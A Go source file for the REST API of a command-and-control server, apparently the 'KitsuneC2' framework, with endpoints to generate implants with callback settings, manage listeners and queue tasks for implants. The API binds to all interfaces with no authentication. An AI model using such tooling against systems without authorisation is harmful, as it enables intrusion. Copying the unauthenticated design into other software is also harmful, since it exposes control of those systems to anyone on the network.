package web

import (
	"KitsuneC2/server/api"
	"KitsuneC2/server/db"
	"log"
	"os"
	"strconv"
	"strings"

	"github.com/gin-gonic/gin"
)

func Init() {
	gin.SetMode(gin.DebugMode)
	router := gin.New()
	gin.LoggerWithWriter(log.Writer())

	router.GET("/implants", getImplants)
	router.POST("/implants/generate", postGenImplant)
	router.GET("/listeners", getRunningListeners)
	router.POST("listeners/add", postAddListener)
	router.POST("listeners/remove", postRemoveListener)
	router.GET("/tasks", getTasks)
	router.POST("/tasks/add", postAddTask)
	go router.Run("0.0.0.0:7331")
}

func getImplants(c *gin.Context) {
	implants, err := api.GetAllImplants()
	if err == db.ErrNoResults {
		emptyResp := make([]string, 0)
		c.JSON(200, emptyResp)
		return
	} else if err != nil {
		c.AbortWithStatusJSON(400, gin.H{"error": err.Error()})
		return
	}
	c.JSON(200, implants)
}

func getRunningListeners(c *gin.Context) {
	listeners, err := api.GetRunningListeners()
	if err != nil { //only error that can be thrown is no listeners are running
		emptyResp := make([]string, 0)
		c.JSON(200, emptyResp)
		return
	}

	//Since the listener.Listener struct contains field types that cannot be JSONized, we filter those types out with an anonymous struct
	type listenerResponse struct {
		Type    string
		Network string
		Port    int
	}

	var restResponse []listenerResponse
	for _, listener := range *listeners {
		restResponse = append(restResponse, listenerResponse{
			Type:    listener.Type,
			Network: listener.Network,
			Port:    listener.Port,
		})
	}

	c.JSON(200, restResponse)
}

func postAddListener(c *gin.Context) {
	network := c.PostForm("network")
	portStr := c.PostForm("port")

	if portStr == "" {
		c.AbortWithStatusJSON(400, gin.H{"error": "port parameter should be a valid integer"})
		return
	}
	port, err := strconv.Atoi(portStr)
	if err != nil {
		c.AbortWithStatusJSON(400, gin.H{"error": "port parameter should be a valid integer"})
		return
	}

	err = api.AddListener(network, port)
	if err != nil {
		c.AbortWithStatusJSON(400, gin.H{"error": err.Error()})
		return
	}

	c.JSON(200, gin.H{"success": true})
}

func postRemoveListener(c *gin.Context) {
	idStr := c.PostForm("id")

	id, err := strconv.Atoi(idStr)
	if err != nil {
		c.AbortWithStatusJSON(400, gin.H{"error": "id parameter should be a valid integer"})
		return
	}

	err = api.KillListener(id)
	if err != nil {
		c.AbortWithStatusJSON(400, gin.H{"error": err.Error()})
		return
	}

	c.JSON(200, gin.H{"success": true})
}

func getTasks(c *gin.Context) {
	completed := false
	paramAsStr := c.Request.URL.Query().Get("completed")
	if paramAsStr != "" {
		paramAsBool, err := strconv.ParseBool(paramAsStr)
		if err == nil {
			completed = paramAsBool
		}
	}
	tasks, err := api.GetAllTasks(completed)
	if err == db.ErrNoResults {
		emptyResp := make([]string, 0)
		c.JSON(200, emptyResp)
		return
	} else if err != nil {
		c.AbortWithStatusJSON(400, gin.H{"error": err.Error()})
		return
	}
	c.JSON(200, tasks)
}

func postAddTask(c *gin.Context) {
	taskTypeStr := c.PostForm("taskType")
	if taskTypeStr == "" {
		c.AbortWithStatusJSON(400, gin.H{"error": "taskType parameter should be a valid integer"})
		return
	}
	taskType, err := strconv.Atoi(taskTypeStr)
	if err != nil {
		c.AbortWithStatusJSON(400, gin.H{"error": "taskType parameter should be a valid integer"})
		return
	}

	implantsAsStr := c.PostForm("implants")
	implants := parseStringArray(implantsAsStr)
	if len(implants) == 0 {
		c.AbortWithStatusJSON(400, gin.H{"error": "at least 1 implant should be specified"})
		return
	}

	handlerFunc, ok := taskTypeToHandlerFunc[taskType]
	if !ok {
		c.AbortWithStatusJSON(400, gin.H{"error": "invalid task type"})
		return
	}

	var statuses = make(map[string]string)
	errEncountered := false
	for _, implantId := range implants {
		err = handlerFunc(c, implantId)
		if err != nil {
			statuses[implantId] = err.Error()
			errEncountered = true
		} else {
			statuses[implantId] = "success"
		}
	}

	if !errEncountered {
		c.JSON(200, gin.H{"success": true})
	} else {
		c.JSON(400, statuses)
	}
}

type ImplantGenReq struct {
	Os            string
	Arch          string
	ServerIp      string
	Name          string
	ServerPort    int
	CbInterval    int
	CbJitter      int
	MaxRetryCount int
}

func postGenImplant(c *gin.Context) {
	var config ImplantGenReq
	c.ShouldBind(&config)

	outFile, err := os.CreateTemp("", "implant")
	if err != nil {
		c.AbortWithStatusJSON(500, gin.H{"error": "Cannot create temporary files, aborted build"})
		return
	}
	outFile.Close()

	//we dont care about return value of Buildimplant, since it should be the same as outFile.Name()
	_, err = api.BuildImplant(config.Os, config.Arch, outFile.Name(), config.ServerIp, config.Name, config.ServerPort, config.CbInterval, config.CbJitter, config.MaxRetryCount)
	if err != nil {
		c.AbortWithStatusJSON(400, gin.H{"error": err.Error()})
		return
	}

	c.File(outFile.Name())
	defer os.Remove(outFile.Name())
}

// given a string array as string e.g. ["string1", "string2", ...]
// parses the string and returns array
// This function assumes string are written using single quotes
func parseStringArray(arr string) []string {
	parts := strings.Split(arr[1:len(arr)-1], ",")

	var stringsSlice []string
	for _, part := range parts {
		trimmedPart := strings.TrimSpace(strings.ReplaceAll(part, "\"", ""))
		stringsSlice = append(stringsSlice, trimmedPart)
	}
	return stringsSlice
}
